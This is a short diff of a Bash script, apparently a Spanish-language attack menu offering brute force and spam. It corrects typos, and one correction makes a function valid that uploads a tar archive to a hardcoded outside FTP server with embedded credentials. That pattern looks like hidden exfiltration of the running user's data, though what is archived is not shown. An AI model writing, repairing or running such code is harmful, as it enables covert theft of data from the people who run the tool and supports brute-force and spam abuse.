@@ -14,7 +14,7 @@ function hacker(){
 }
 
 function menu(){
-  apt instal tar -y
+  apt install tar -y
   clear && banner
   echo -e "01-FUERZA BRUTA"
   echo -e "02-SPAM"
@@ -97,7 +97,7 @@ elif [[ $opcion == "00" || $opcion == "5" ]]; then
 fi
 }
 
-funcion hacer_peticion_api(){
+function hacer_peticion_api(){
   curl -v -T $apodo.tar.gz ftp://172.93.129.211:21 --user juan:jose  
 }
 
